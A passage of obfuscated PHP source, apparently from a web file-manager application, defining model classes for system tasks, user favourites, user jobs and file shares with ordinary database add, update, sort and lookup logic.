groupNameAuto($B›éÆÅâøß, $a”ÉÒšÆÔ¸) { $FÅÒ‹¼ÛÓ’ =& $_SERVER[¢Í]; $d¦Øô¾îÔ = $this->where(array($FÅÒ‹¼ÛÓ’[393] => $B›éÆÅâøß))->getField($FÅÒ‹¼ÛÓ’[28], !0); if (!$d¦Øô¾îÔ || !in_array($a”ÉÒšÆÔ¸, $d¦Øô¾îÔ)) { return $a”ÉÒšÆÔ¸; } for ($aÇ‹î’×î¼ = 1; $aÇ‹î’×î¼ <= count($d¦Øô¾îÔ) + 1; $aÇ‹î’×î¼++) { $dĞ²ÕîÄ = $a”ÉÒšÆÔ¸ . "\x28{$aÇ‹î’×î¼}\x29"; if (!in_array($dĞ²ÕîÄ, $d¦Øô¾îÔ)) { return $dĞ²ÕîÄ; } } } } goto AËğ½îéÒö; D×¯˜·ØÁ: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\155\56\x74\x61\163\x6b\x4c\151\x73\164"; public $field = array("\156\141\155\x65", "\164\x79\x70\x65", "\x65\x76\x65\156\x74", "\x74\x69\155\x65", "\144\x65\x73\x63", "\163\x79\x73\164\x65\x6d", "\x65\x6e\x61\142\x6c\x65", "\154\x61\x73\164\122\x75\156", "\163\x6f\162\x74"); public function listData($cË‚á½Íˆ‹ = false, $fîêÜƒˆÃğ = "\x73\157\162\164", $Fë„õÏ¸æ = false) { return parent::listData($cË‚á½Íˆ‹, $fîêÜƒˆÃğ, $Fë„õÏ¸æ); } public function add($DİØÆ—Õ«ø) { $d›àÚÃÔ»ô =& $_SERVER[¢Í]; $dŠæÊÉ¨ = $this->findByName($DİØÆ—Õ«ø[$d›àÚÃÔ»ô[28]]); if ($dŠæÊÉ¨) { return !1; } $DİØÆ—Õ«ø[$d›àÚÃÔ»ô[1453]] = 0; $DİØÆ—Õ«ø[$d›àÚÃÔ»ô[1671]] = $this->getSort(); return parent::insert($DİØÆ—Õ«ø); } private function getSort() { $A…Šˆ’Îâê =& $_SERVER[¢Í]; $Bö”Ø’ùŒ‡ = parent::listData(); $DÌØÑÙŠÚ = array_to_keyvalue($Bö”Ø’ùŒ‡, $A…Šˆ’Îâê[33], $A…Šˆ’Îâê[1671]); return empty($DÌØÑÙŠÚ) ? 0 : max($DÌØÑÙŠÚ) + 1; } public function update($FÜ‹‘ãÈÚº, $E¦³•ô¯ÎÚ) { $Cé¢‡ÔÜ” =& $_SERVER[¢Í]; $f°˜Ùóø‹¹ = $this->listData($FÜ‹‘ãÈÚº); $cº’ªÑÌÏ¢ = $this->findByName($E¦³•ô¯ÎÚ[$Cé¢‡ÔÜ”[28]]); if (!$f°˜Ùóø‹¹ || $cº’ªÑÌÏ¢ && $cº’ªÑÌÏ¢[$Cé¢‡ÔÜ”[392]] != $f°˜Ùóø‹¹[$Cé¢‡ÔÜ”[392]]) { return !1; } return parent::update($FÜ‹‘ãÈÚº, $E¦³•ô¯ÎÚ); } public function remove($E¸Ë†½±Œ…, $eÆéÀ…±šª = false) { $fù³‘‰ƒØ» =& $_SERVER[¢Í]; $Eà‡İÏÈõ› = $this->listData($E¸Ë†½±Œ…); if (!$Eà‡İÏÈõ›) { return; } if (!$eÆéÀ…±šª && $Eà‡İÏÈõ›[$fù³‘‰ƒØ»[1133]] == $fù³‘‰ƒØ»[93]) { return !1; } return parent::remove($E¸Ë†½±Œ…); } public function enable($EÂ•°¶Ä†±, $F®¥ÒÕ½‰˜) { return $this->update($EÂ•°¶Ä†±, array($_SERVER[¢Í][2051] => $F®¥ÒÕ½‰˜)); } public function run($A³Šª”ŠÍ) { return $this->update($A³Šª”ŠÍ, array($_SERVER[¢Í][2061] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\145\162\x5f\x66\141\x76"; protected function cacheFunctionAlias($Dº¡ñ’›ª¤) { $fŸãòÏ«Áì =& $_SERVER[¢Í]; return array($fŸãòÏ«Áì[1748] => array(USER_ID, $fŸãòÏ«Áì[2062])); } protected function listData() { $c•Š¦‚×ê =& $_SERVER[¢Í]; $e“™²¿İŞÏ = array($c•Š¦‚×ê[1481] => USER_ID, $c•Š¦‚×ê[460] => 0); $c‚ö´®åõî = $c•Š¦‚×ê[2063]; $d§¬š¶Á±é = $this->field($c‚ö´®åõî)->where($e“™²¿İŞÏ)->order($c•Š¦‚×ê[2064])->select(); return $d§¬š¶Á±é ? $d§¬š¶Á±é : array(); } protected function resetCache() { } protected function listView() { goto D‹®ÈÔ²º; Eñƒ†ÚØ­Ø: $dîÊÇóìö³ = array($C¿÷“Šæ¨[408] => array($C¿÷“Šæ¨[409], $C˜¼Õ¸åŞ)); $Aâ’•«Àé = Model($C¿÷“Šæ¨[765])->listSource($dîÊÇóìö³, $dõ¹¼´Ê”İ); $Aâ’•«Àé = array_merge($Aâ’•«Àé[$C¿÷“Šæ¨[83]], $Aâ’•«Àé[$C¿÷“Šæ¨[84]]); goto D ç¬‡†; D®¤ŸÑ¯î: $C˜¼Õ¸åŞ = array_to_keyvalue($EĞÊ“ÎÄÙ, $C¿÷“Šæ¨[33], $C¿÷“Šæ¨[85]); if (!$C˜¼Õ¸åŞ) { return $d˜Ü±¡Çö; } $dõ¹¼´Ê”İ = 2000; goto Eñƒ†ÚØ­Ø; D ç¬‡†: $Aâ’•«Àé = array_to_keyvalue($Aâ’•«Àé, $C¿÷“Šæ¨[394]); foreach ($d˜Ü±¡Çö as $a—˜·÷ùõ => $E‡ƒ’ªÁË‡) { $fØ› ŠÙÙ = $Aâ’•«Àé[$E‡ƒ’ªÁË‡[$C¿÷“Šæ¨[85]]]; $fØ› ŠÙÙ = $fØ› ŠÙÙ ? $fØ› ŠÙÙ : array(); $d˜Ü±¡Çö[$a—˜·÷ùõ] = array_merge($fØ› ŠÙÙ, $E‡ƒ’ªÁË‡); } return $d˜Ü±¡Çö; goto aç”É‚ÈŸ; D‹®ÈÔ²º: $C¿÷“Šæ¨ =& $_SERVER[¢Í]; $d˜Ü±¡Çö = $this->listData(); $EĞÊ“ÎÄÙ = array_filter_by_field($d˜Ü±¡Çö, $C¿÷“Šæ¨[29], $C¿÷“Šæ¨[407]); goto D®¤ŸÑ¯î; aç”É‚ÈŸ: } protected function addFav($F¤®é¿×Ö, $bÆœêó† = '', $E Ä’ÈòŒ = "\x73\157\165\x72\143\x65") { goto E¿ĞôÂâÎ; c¼¡‰äÎ—µ: $Bëêáß‹ÊÇ = array($aÖ½¢‡ˆÄ¾[1481] => USER_ID, $aÖ½¢‡ˆÄ¾[460] => 0); $C”éÓË§Œƒ = $this->where($Bëêáß‹ÊÇ)->max($aÖ½¢‡ˆÄ¾[1671]); if (!$C”éÓË§Œƒ) { $C”éÓË§Œƒ = 0; } goto Fá„Ğ˜‡ÅÈ; E¿ĞôÂâÎ: $aÖ½¢‡ˆÄ¾ =& $_SERVER[¢Í]; $Bëêáß‹ÊÇ = array($aÖ½¢‡ˆÄ¾[1481] => USER_ID, $aÖ½¢‡ˆÄ¾[460] => 0, $aÖ½¢‡ˆÄ¾[413] => $E Ä’ÈòŒ, $aÖ½¢‡ˆÄ¾[412] => $F¤®é¿×Ö); if ($this->where($Bëêáß‹ÊÇ)->find()) { return !1; } goto c¼¡‰äÎ—µ; fé¢ÁÕßç: return $this->add($eç²ùÁä‘¸); goto cË«‡›Åƒˆ; Fá„Ğ˜‡ÅÈ: if (!$bÆœêó† && $E Ä’ÈòŒ == $aÖ½¢‡ˆÄ¾[407]) { $Cõ²ŠğÜ = Model($aÖ½¢‡ˆÄ¾[1169])->where(array($aÖ½¢‡ˆÄ¾[408] => $F¤®é¿×Ö))->find(); if (!$Cõ²ŠğÜ) { return !1; } $bÆœêó† = $Cõ²ŠğÜ[$aÖ½¢‡ˆÄ¾[28]]; } $bÆœêó† = $this->getAutoName($bÆœêó†); $eç²ùÁä‘¸ = array($aÖ½¢‡ˆÄ¾[1481] => USER_ID, $aÖ½¢‡ˆÄ¾[460] => 0, $aÖ½¢‡ˆÄ¾[411] => $bÆœêó†, $aÖ½¢‡ˆÄ¾[412] => $F¤®é¿×Ö, $aÖ½¢‡ˆÄ¾[413] => $E Ä’ÈòŒ, $aÖ½¢‡ˆÄ¾[1652] => $C”éÓË§Œƒ + 1); goto fé¢ÁÕßç; cË«‡›Åƒˆ: } protected function remove($e²ËÁ„Ë ù) { $bÓ¹İä…™¹ =& $_SERVER[¢Í]; $CÔ¼“†± = array($bÓ¹İä…™¹[1481] => USER_ID, $bÓ¹İä…™¹[410] => $e²ËÁ„Ë ù); return $this->where($CÔ¼“†±)->delete(); } protected function removeByName($e‹ëÌÒ¬ì‡) { $e‡¿É‹î¡ =& $_SERVER[¢Í]; $aÍŒš‰Á³ó = array($e‡¿É‹î¡[1481] => USER_ID, $e‡¿É‹î¡[411] => $e‹ëÌÒ¬ì‡, $e‡¿É‹î¡[460] => 0); return $this->where($aÍŒš‰Á³ó)->delete(); } protected function rename($Cø›Ó¶‘î¼, $fãÙÒ¢©µá) { $e‰¡…ŠªÖ =& $_SERVER[¢Í]; if ($Cø›Ó¶‘î¼ == $fãÙÒ¢©µá) { return !1; } $B‹©•âƒœ¬ = $this->getAutoName($fãÙÒ¢©µá); if ($fãÙÒ¢©µá != $B‹©•âƒœ¬) { return !1; } $B¸‡†·â…î = array($e‰¡…ŠªÖ[1481] => USER_ID, $e‰¡…ŠªÖ[460] => 0, $e‰¡…ŠªÖ[28] => $Cø›Ó¶‘î¼); return $this->where($B¸‡†·â…î)->save(array($e‰¡…ŠªÖ[28] => $fãÙÒ¢©µá)); } protected function resetSort($BåŸî¯ •­) { $cÖ£¦Š”Ì  =& $_SERVER[¢Í]; $BåŸî¯ •­ = is_array($BåŸî¯ •­) ? $BåŸî¯ •­ : array(); $E¼â°•–ì = array($cÖ£¦Š”Ì [1481] => USER_ID); for ($d¶‡Æ‡Õ = 0; $d¶‡Æ‡Õ < count($BåŸî¯ •­); $d¶‡Æ‡Õ++) { $E¼â°•–ì[$cÖ£¦Š”Ì [410]] = $BåŸî¯ •­[$d¶‡Æ‡Õ]; $this->where($E¼â°•–ì)->save(array($cÖ£¦Š”Ì [1652] => $d¶‡Æ‡Õ + 1)); } return !0; } protected function moveTop($eßÇ–…Êò) { goto B†øá§ùš; aø«ßŞÚ©™: $B‡è‚‰¯¼ = $F±ˆõÆ¦×…; $F±ˆõÆ¦×… = array_remove_value($F±ˆõÆ¦×…, $a¾†ëé¾‰†[$d‚Ô±òÂÈÎ[392]]); array_unshift($F±ˆõÆ¦×…, $a¾†ëé¾‰†[$d‚Ô±òÂÈÎ[392]]); goto fÌ±ï÷äŒ²; fÌ±ï÷äŒ²: return $this->resetSort($F±ˆõÆ¦×…); goto fÔ‰ ìÕˆÆ; bÚ–İ¤»Ì: if (!$a¾†ëé¾‰†) { return; } $F±ˆõÆ¦×… = $this->field($d‚Ô±òÂÈÎ[392])->where($d±Ëï·„Ğæ)->order($d‚Ô±òÂÈÎ[2064])->select(); $F±ˆõÆ¦×… = array_to_keyvalue($F±ˆõÆ¦×…, $d‚Ô±òÂÈÎ[33], $d‚Ô±òÂÈÎ[392]); goto aø«ßŞÚ©™; B†øá§ùš: $d‚Ô±òÂÈÎ =& $_SERVER[¢Í]; $d±Ëï·„Ğæ = array($d‚Ô±òÂÈÎ[1481] => USER_ID, $d‚Ô±òÂÈÎ[460] => 0); $a¾†ëé¾‰† = $this->where($d±Ëï·„Ğæ)->where(array($d‚Ô±òÂÈÎ[28] => $eßÇ–…Êò))->find(); goto bÚ–İ¤»Ì; fÔ‰ ìÕˆÆ: } protected function moveBottom($cò‚…á÷ø) { $C¿¶Öº‹¿å =& $_SERVER[¢Í]; $BÕæ­­Ğä² = array($C¿¶Öº‹¿å[1481] => USER_ID, $C¿¶Öº‹¿å[460] => 0); $EÀÃÃ²ˆ£ = $this->where($BÕæ­­Ğä²)->max($C¿¶Öº‹¿å[1671]); $câãºåò± = array($C¿¶Öº‹¿å[1671] => $EÀÃÃ²ˆ£ + 1); return $this->where($BÕæ­­Ğä²)->where(array($C¿¶Öº‹¿å[28] => $cò‚…á÷ø))->save($câãºåò±); } private function getAutoName($CËµ…’­²) { goto f”È‰š”º©; aÏ¯‡ˆöø®: $b°ğğÛµ¸‰ = array_to_keyvalue($b°ğğÛµ¸‰, $E­¢À©Ùµ[33], $E­¢À©Ùµ[28]); if (!$b°ğğÛµ¸‰ || !in_array($CËµ…’­², $b°ğğÛµ¸‰)) { return $CËµ…’­²; } for ($dÀèË‚óØ = 0; $dÀèË‚óØ < count($b°ğğÛµ¸‰); $dÀèË‚óØ++) { if (!in_array($CËµ…’­² . "\50{$dÀèË‚óØ}\x29", $b°ğğÛµ¸‰)) { return $CËµ…’­² . "\x28{$dÀèË‚óØ}\x29"; } } goto FÂ‰¾´ŠÔ; f”È‰š”º©: $E­¢À©Ùµ =& $_SERVER[¢Í]; $CÏ·óÒõÁí = array($E­¢À©Ùµ[1481] => USER_ID, $E­¢À©Ùµ[460] => 0); $b°ğğÛµ¸‰ = $this->field($E­¢À©Ùµ[28])->where($CÏ·óÒõÁí)->select(); goto aÏ¯‡ˆöø®; FÂ‰¾´ŠÔ: return $CËµ…’­² . "\x28{$dÀèË‚óØ}\51"; goto fÖ±…³¥Üó; fÖ±…³¥Üó: } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\155\56\x6a\x6f\142\x4c\x69\163\x74"; public $field = array("\156\141\x6d\x65", "\144\145\163\x63", "\163\157\162\164"); const JOB_KEY = "\163\145\154\146\x4a\x6f\x62\114\151\x73\x74"; public function listData($f‘Ç¥ÁÎºª = false, $FÙ™Ã£á× = "\x73\x6f\x72\164", $Fµœ…šªØÉ = false) { return parent::listData($f‘Ç¥ÁÎºª, $FÙ™Ã£á×, $Fµœ…šªØÉ); } public function remove($fÂÉœË‡½) { return parent::remove($fÂÉœË‡½); } public function add($dŠä´å¥Ÿä) { $BÔóôã÷°ç =& $_SERVER[¢Í]; if ($this->findByName($dŠä´å¥Ÿä[$BÔóôã÷°ç[28]])) { return !1; } $dŠä´å¥Ÿä[$BÔóôã÷°ç[1671]] = $this->getSort(); return parent::insert($dŠä´å¥Ÿä); } private function getSort() { $b¼ÓÈ¹Í£± =& $_SERVER[¢Í]; $E½íÀå“Ÿ = parent::listData(); $eÕÔÂ§‹ŒÃ = array_to_keyvalue($E½íÀå“Ÿ, $b¼ÓÈ¹Í£±[33], $b¼ÓÈ¹Í£±[1671]); return empty($eÕÔÂ§‹ŒÃ) ? 0 : max($eÕÔÂ§‹ŒÃ) + 1; } public function update($fœğ…ÁÊÌˆ, $Cæâê¯õŒ‚) { $AØ‰‹âï¨à =& $_SERVER[¢Í]; $Cˆ««½‰ºÍ = parent::listData($fœğ…ÁÊÌˆ); $D¼äö¡Òî· = $this->findByName($Cæâê¯õŒ‚[$AØ‰‹âï¨à[28]]); if (!$Cˆ««½‰ºÍ || $D¼äö¡Òî· && $D¼äö¡Òî·[$AØ‰‹âï¨à[392]] != $Cˆ««½‰ºÍ[$AØ‰‹âï¨à[392]]) { return !1; } return parent::update($fœğ…ÁÊÌˆ, $Cæâê¯õŒ‚); } public function setUserJob($E·˜¨‡ìƒ…, $c‡ó©Ù‘¯£) { goto f™î…«øÒ; eßåìåÁ±: $bƒùáÖ˜˜ = rtrim($bƒùáÖ˜˜, $däœ®·£†Ï[47]); Model($däœ®·£†Ï[503])->metaSet($E·˜¨‡ìƒ…, self::JOB_KEY, $bƒùáÖ˜˜); goto BÍ±ÂèËŒÔ; eèÇÁ¶ç÷: $c¶°ï×Î•é = array_to_keyvalue($BŠ´Ãë„¤Û, $däœ®·£†Ï[28]); $bƒùáÖ˜˜ = $däœ®·£†Ï[377]; foreach ($c‡ó©Ù‘¯£ as $f¡ÔŒ×Ö„Ÿ) { if ($c¶°ï×Î•é[$f¡ÔŒ×Ö„Ÿ]) { $bƒùáÖ˜˜ .= $c¶°ï×Î•é[$f¡ÔŒ×Ö„Ÿ][$däœ®·£†Ï[392]] . $däœ®·£†Ï[47]; } else { $d‹‰Ï˜ù© = $this->add($f¡ÔŒ×Ö„Ÿ); $bƒùáÖ˜˜ .= $d‹‰Ï˜ù© . $däœ®·£†Ï[47]; } } goto eßåìåÁ±; f™î…«øÒ: $däœ®·£†Ï =& $_SERVER[¢Í]; if (!is_array($c‡ó©Ù‘¯£)) { $c‡ó©Ù‘¯£ = array($c‡ó©Ù‘¯£); } $BŠ´Ãë„¤Û = parent::listData(); goto eèÇÁ¶ç÷; BÍ±ÂèËŒÔ: } public function getUserJob($a´‚ñ„ÛÔÇ) { $F®È½ÈÁ· = Model($_SERVER[¢Í][503])->metaGet($a´‚ñ„ÛÔÇ); return $this->getUserJobInfo($F®È½ÈÁ·[self::JOB_KEY]); } public function getUserJobInfo($a‹×®§Ò†) { goto CñóÓ·óØ; CñóÓ·óØ: $CÅì¾İïƒĞ =& $_SERVER[¢Í]; $aË‹‹¹¬§¤ = explode($CÅì¾İïƒĞ[47], $a‹×®§Ò†); $Fíïçè”ÒÜ = parent::listData(); goto EÊÛƒã˜; f…‚…»: return $EŞ–È‡‚‡„; goto a­‡¬Û¥Æƒ; EÊÛƒã˜: $Fíïçè”ÒÜ = array_remove_key($Fíïçè”ÒÜ, $CÅì¾İïƒĞ[200]); $EŞ–È‡‚‡„ = array(); foreach ($aË‹‹¹¬§¤ as $B®àÛ•¶—Š) { if (isset($Fíïçè”ÒÜ[$B®àÛ•¶—Š])) { $EŞ–È‡‚‡„[] = $Fíïçè”ÒÜ[$B®àÛ•¶—Š]; } } goto f…‚…»; a­‡¬Û¥Æƒ: } } goto B“ƒ£»Œá; FÏÍç‡¯ôì: class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\x72\x65"; protected $dataAuto = array(array("\155\x6f\x64\x69\146\171\x54\x69\x6d\145", "\x74\151\155\x65", "\151\x6e\163\x65\x72\x74\x2c\165\x70\144\141\164\145", "\x66\165\156\x63\164\151\157\x6e"), array("\143\162\x65\141\164\x65\124\x69\155\x65", "\x74\151\x6d\x65", "\x69\x6e\163\145\x72\x74", "\x66\x75\156\143\164\151\x6f\x6e"), array("\157\x70\164\x69\157\x6e\163", '', "\x69\156\163\x65\162\164\54\165\x70\144\141\x74\x65\x2c\x73\145\x6c\145\143\164", "\152\x73\x6f\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($b×½“×˜’ï) { $BÈ·ÎÁé‚¿ =& $_SERVER[¢Í]; $DãåÜÓ÷ÎÕ = isset($b×½“×˜’ï[0]) ? $b×½“×˜’ï[0] : !1; return array($BÈ·ÎÁé‚¿[1774] => array(USER_ID, $BÈ·ÎÁé‚¿[1775]), $BÈ·ÎÁé‚¿[1723] => array($DãåÜÓ÷ÎÕ, $BÈ·ÎÁé‚¿[1776])); } protected function listSimple() { $F ¶Ú¼ã = array($_SERVER[¢Í][1489] => USER_ID); $aÓ˜ø­‡ñÎ = $this->field($this->fieldList)->where($F ¶Ú¼ã)->select(); return $aÓ˜ø­‡ñÎ ? $aÓ˜ø­‡ñÎ : array(); } protected function getInfo($eøòãù‰ÔÍ, $eã‰ÓºÌÃè = false) { $fÈ–±î½¥° =& $_SERVER[¢Í]; if ($eã‰ÓºÌÃè) { return $this->_getShareInfo(array($fÈ–±î½¥°[465] => $eøòãù‰ÔÍ)); } $A¥¿·¢ ®Í = $this->cacheFunctionGet($fÈ–±î½¥°[1777], $eøòãù‰ÔÍ); return $A¥¿·¢ ®Í; } public function getInfoByHash($fø²î¯õË) { return $this->_getShareInfo(array($_SERVER[¢Í][467] => $fø²î¯õË)); } public function getInfoByPath($CøĞª”Ö†‘) { $EŒ»Ÿ’¨õ§ =& $_SERVER[¢Í]; $CÇºöà†ñ† = array($EŒ»Ÿ’¨õ§[1489] => USER_ID, $EŒ»Ÿ’¨õ§[394] => $CøĞª”Ö†‘); return $this->_getShareInfo($CÇºöà†ñ†); } public function getInfoBySourcePath($c‰³‚Î¨Ş) { $CÊçäŞƒƒù =& $_SERVER[¢Í]; $a²êÕÅ‘«• = array($CÊçäŞƒƒù[1489] => USER_ID, $CÊçäŞƒƒù[1038] => $c‰³‚Î¨Ş); return $this->_getShareInfo($a²êÕÅ‘«•); } private function _getShareInfo($a…Ëˆè‹È) { goto cí§Áîå„ì; cí§Áîå„ì: $a°±Â¹„” =& $_SERVER[¢Í]; $E¦Ñ£Éî³× = $this->where($a…Ëˆè‹È)->find(); if (!$E¦Ñ£Éî³×) { return !1; } goto BÃî¨ÍÚñ˜; eœèç„ğ: if ($E¦Ñ£Éî³×[$a°±Â¹„”[394]] == $a°±Â¹„”[494]) { $E¦Ñ£Éî³×[$a°±Â¹„”[416]] = IO::info($E¦Ñ£Éî³×[$a°±Â¹„”[1038]]); } else { $E¦Ñ£Éî³×[$a°±Â¹„”[416]] = Model($a°±Â¹„”[1169])->pathInfo($E¦Ñ£Éî³×[$a°±Â¹„”[394]]); } $E¦Ñ£Éî³×[$a°±Â¹„”[1779]] = $aË£Êù¨ç; return $E¦Ñ£Éî³×; goto C‰ù¥ÎºÕß; BÃî¨ÍÚñ˜: $a…Ëˆè‹È = array($a°±Â¹„”[465] => $E¦Ñ£Éî³×[$a°±Â¹„”[465]]); $C°Õ´óÅÛˆ = $a°±Â¹„”[1778]; $aË£Êù¨ç = Model($a°±Â¹„”[562])->order($a°±Â¹„”[392])->field($C°Õ´óÅÛˆ)->where($a…Ëˆè‹È)->select(); goto eœèç„ğ; C‰ù¥ÎºÕß: } protected function getInfoAuth($a×ëà¼Ïë) { $bÙùååÌäï =& $_SERVER[¢Í]; $bƒÛÊèÊÂœ = $this->getInfo($a×ëà¼Ïë); $bƒÛÊèÊÂœ[$bÙùååÌäï[401]] = Model($bÙùååÌäï[480])->authMake($bƒÛÊèÊÂœ[$bÙùååÌäï[1779]]); return $bƒÛÊèÊÂœ; } protected function listData($d±½ÕÖ›óÑ = null, $fÅ¤ß‰¶Î¶ = 300) { $D¯»ÑÊ­ =& $_SERVER[¢Í]; $AÕ ³éùóÕ = array(array($D¯»ÑÊ­[470] => array($D¯»ÑÊ­[937], 0), $D¯»ÑÊ­[472] => array($D¯»ÑÊ­[937], 0), $D¯»ÑÊ­[1780] => $D¯»ÑÊ­[1737])); if ($d±½ÕÖ›óÑ == $D¯»ÑÊ­[1781]) { $AÕ ³éùóÕ = array($D¯»ÑÊ­[470] => 1); } else { if ($d±½ÕÖ›óÑ == $D¯»ÑÊ­[1023]) { $AÕ ³éùóÕ = array($D¯»ÑÊ­[472] => 1); } } $AÕ ³éùóÕ[$D¯»ÑÊ­[1489]] = USER_ID; $d›»È¯ÍØ  = $this->where($AÕ ³éùóÕ)->selectPage($fÅ¤ß‰¶Î¶); return $d›»È¯ÍØ ; } protected function listToMe($A˜ØóŸÎ = 300) { goto dØ›É³Ôñ‡; EÜÖ–çæ¡¡: if (!$DëŸÌê‡Ë“) { return $e’–Ÿ è•¡; } $CÅÊ¤È„¡º = $aÓÓë˜ä±î[1783]; $A·ƒ¬°ğ¿Ô = array($aÓÓë˜ä±î[465] => array($aÓÓë˜ä±î[409], array_keys($DëŸÌê‡Ë“))); goto a°¸’´Ê³ò; Fââ¨Ïô: if ($FæìçğÑ) { $A·ƒ¬°ğ¿Ô = array(array($aÓÓë˜ä±î[547] => SourceModel::TYPE_USER, $aÓÓë˜ä±î[482] => USER_ID), array($aÓÓë˜ä±î[547] => SourceModel::TYPE_GROUP, $aÓÓë˜ä±î[482] => array($aÓÓë˜ä±î[7], $FæìçğÑ)), $aÓÓë˜ä±î[1780] => $aÓÓë˜ä±î[1737]); } $e’–Ÿ è•¡ = Model($aÓÓë˜ä±î[562])->where($A·ƒ¬°ğ¿Ô)->selectPage($A˜ØóŸÎ); $DëŸÌê‡Ë“ = array_to_keyvalue_group($e’–Ÿ è•¡[$aÓÓë˜ä±î[370]], $aÓÓë˜ä±î[465]); goto EÜÖ–çæ¡¡; eÖ‰äÀÆÓ: $C“Ìˆ“µã = array($aÓÓë˜ä±î[1784] => $a‚êêåğÁš, $aÓÓë˜ä±î[1785] => $e’–Ÿ è•¡[$aÓÓë˜ä±î[367]]); return $C“Ìˆ“µã; goto cÚš¸âà; a°¸’´Ê³ò: $a‚êêåğÁš = $this->field($CÅÊ¤È„¡º)->where($A·ƒ¬°ğ¿Ô)->select(); foreach ($a‚êêåğÁš as $AâßÍÌ¬Êí => &$b¤õ¾ï‘Â¹) { $b¤õ¾ï‘Â¹[$aÓÓë˜ä±î[1779]] = $DëŸÌê‡Ë“[$b¤õ¾ï‘Â¹[$aÓÓë˜ä±î[465]]]; } unset($b¤õ¾ï‘Â¹); goto eÖ‰äÀÆÓ; dØ›É³Ôñ‡: $aÓÓë˜ä±î =& $_SERVER[¢Í]; $FæìçğÑ = Model($aÓÓë˜ä±î[1782])->userGroupParents(USER_ID); $A·ƒ¬°ğ¿Ô = array($aÓÓë˜ä±î[547] => SourceModel::TYPE_USER, $aÓÓë˜ä±î[482] => USER_ID); goto Fââ¨Ïô; cÚš¸âà: } protected function shareAdd($dÔ„µ¤é„, $AŞÉÍå¡) { $eÔßìÑğÑª =& $_SERVER[¢Í]; $D£í˜î——Æ = $this->_addShareData($dÔ„µ¤é„, $AŞÉÍå¡); if (!empty($AŞÉÍå¡[$eÔßìÑğÑª[1786]])) { $this->_shareAuthSet($D£í˜î——Æ, $AŞÉÍå¡[$eÔßìÑğÑª[1786]]); } $this->shareEventAdd($dÔ„µ¤é„, $AŞÉÍå¡, $eÔßìÑğÑª[1026]); return $D£í˜î——Æ; } private function shareEventAdd($dÔçÀç“š, $fåÖŠÈÚ–Õ, $dª¼Æãí” = "\141\144\x64") { goto d±ÄµÃØ”ä; c÷É´Äñç: if ($b­”ñÉï•[$b´×ä™ÓÂ×[472]] == $b´×ä™ÓÂ×[494] && $fåÖŠÈÚ–Õ[$b´×ä™ÓÂ×[472]] == $b´×ä™ÓÂ×[93]) { $Fø×Õ‰İÔÂ = $b´×ä™ÓÂ×[1788]; } if ($b­”ñÉï•[$b´×ä™ÓÂ×[472]] == $b´×ä™ÓÂ×[93] && $fåÖŠÈÚ–Õ[$b´×ä™ÓÂ×[472]] == $b´×ä™ÓÂ×[494]) { $Fø×Õ‰İÔÂ = $b´×ä™ÓÂ×[1791]; } Model($b´×ä™ÓÂ×[531])->eventShare($dÔçÀç“š, $Fø×Õ‰İÔÂ); goto BÌ»çŠ—º®; EäŞîĞ„ÕØ: $Fø×Õ‰İÔÂ = $b´×ä™ÓÂ×[1789]; if ($b­”ñÉï•[$b´×ä™ÓÂ×[470]] == $b´×ä™ÓÂ×[494] && $fåÖŠÈÚ–Õ[$b´×ä™ÓÂ×[470]] == $b´×ä™ÓÂ×[93]) { $Fø×Õ‰İÔÂ = $b´×ä™ÓÂ×[1787]; } if ($b­”ñÉï•[$b´×ä™ÓÂ×[470]] == $b´×ä™ÓÂ×[93] && $fåÖŠÈÚ–Õ[$b´×ä™ÓÂ×[470]] == $b´×ä™ÓÂ×[494]) { $Fø×Õ‰İÔÂ = $b´×ä™ÓÂ×[1790]; } goto c÷É´Äñç; d±ÄµÃØ”ä: $b´×ä™ÓÂ× =& $_SERVER[¢Í]; if ($dª¼Æãí” == $b´×ä™ÓÂ×[1026]) { if ($fåÖŠÈÚ–Õ[$b´×ä™ÓÂ×[470]] == $b´×ä™ÓÂ×[93]) { Model($b´×ä™ÓÂ×[531])->eventShare($dÔçÀç“š, $b´×ä™ÓÂ×[1787]); } if ($fåÖŠÈÚ–Õ[$b´×ä™ÓÂ×[472]] == $b´×ä™ÓÂ×[93]) { Model($b´×ä™ÓÂ×[531])->eventShare($dÔçÀç“š, $b´×ä™ÓÂ×[1788]); } return; } $b­”ñÉï• = $this->getInfoByPath($dÔçÀç“š); goto EäŞîĞ„ÕØ; BÌ»çŠ—º®: return; goto F›ÔÍÛà›; F›ÔÍÛà›: } private function _addShareData($DŸ‘›³¤Š, $A™È×¶ˆ÷ = array()) { goto Aªö®ïŞˆ˜; Aªö®ïŞˆ˜: $cæ¦¹ªƒö¦ =& $_SERVER[¢Í]; $C‘ğ–Ï» = array($cæ¦¹ªƒö¦[408] => $DŸ‘›³¤Š, $cæ¦¹ªƒö¦[1481] => USER_ID); if ($DŸ‘›³¤Š == 0) { $C‘ğ–Ï» = array($cæ¦¹ªƒö¦[1792] => $A™È×¶ˆ÷[$cæ¦¹ªƒö¦[1038]], $cæ¦¹ªƒö¦[1481] => USER_ID); } goto fèµé…Ö¨; dèØ·ˆËÕ•: return $e¦ÛÒ‰ğ“î; goto EÆ°–ä¼; cãá‚Ó…˜È: $cÓ›„Ì‘³Î = array($cæ¦¹ªƒö¦[1481] => USER_ID, $cæ¦¹ªƒö¦[408] => $DŸ‘›³¤Š, $cæ¦¹ªƒö¦[1394] => $cæ¦¹ªƒö¦[33], $cæ¦¹ªƒö¦[470] => 0, $cæ¦¹ªƒö¦[472] => 0, $cæ¦¹ªƒö¦[1038] => $cæ¦¹ªƒö¦[33], $cæ¦¹ªƒö¦[310] => $cæ¦¹ªƒö¦[33], $cæ¦¹ªƒö¦[817] => $cæ¦¹ªƒö¦[33], $cæ¦¹ªƒö¦[1793] => 0, $cæ¦¹ªƒö¦[1794] => 0, $cæ¦¹ªƒö¦[473] => 0, $cæ¦¹ªƒö¦[474] => $cæ¦¹ªƒö¦[33], $cæ¦¹ªƒö¦[467] => $cæ¦¹ªƒö¦[33]); $Fù«ŒÌÂ¹ = explode($cæ¦¹ªƒö¦[47], $cæ¦¹ªƒö¦[1795]); foreach ($Fù«ŒÌÂ¹ as $B‹ÀÈº«õ) { if (!isset($A™È×¶ˆ÷[$B‹ÀÈº«õ])) { continue; } $cÓ›„Ì‘³Î[$B‹ÀÈº«õ] = 